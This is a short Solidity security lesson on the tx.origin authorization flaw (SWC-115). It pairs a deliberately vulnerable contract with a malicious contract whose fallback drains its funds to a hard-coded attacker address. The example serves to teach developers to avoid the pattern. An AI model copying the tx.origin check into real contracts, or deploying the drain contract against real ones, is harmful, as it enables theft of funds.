# TxOrigin Attack (SWC-115)

In this lesson we are going to cover a `tx.origin` attack. The global variable `tx.origin` in Solidity always references the address of the original sender of the transaction, of the full call chain. [See the reference in the docs here](https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=tx.origin#block-and-transaction-properties){target=\_blank}. This is different than `msg.sender` in that `msg.sender` references the address of the sender of the current call.

You should never use `tx.origin` in Solidity for authorization ([SWC-115](https://swcregistry.io/docs/SWC-115){target=\_blank}). The following smart contract shows you why. It is susceptible to attack.

```solidity
pragma solidity >0.5.0;

// Example Tx.Origin Authentication Attack
contract VulnerableContract {
  address payable owner = msg.sender;

  function withdraw(address payable _recipient) public {
    require(tx.origin == owner);
    _recipient.transfer(address(this).balance);
  }

  function getBalance() view public returns(uint) {
    return address(this).balance;
  }

  function() external payable {}
}

contract MaliciousContract {
  VulnerableContract vulnerableContract = VulnerableContract(0x08970FEd061E7747CD9a38d680A601510CB659FB);
  address payable attackerAddress = 0xdD870fA1b7C4700F2BD7f44238821C26f7392148;

  function() external payable {
    vulnerableContract.withdraw(attackerAddress);
  }
}
```

In this contract, if the creator of the VulnerableContract is tricked into calling the MaliciousContract, the Malicious contract will be able to drain the VulnerableContract of all funds.
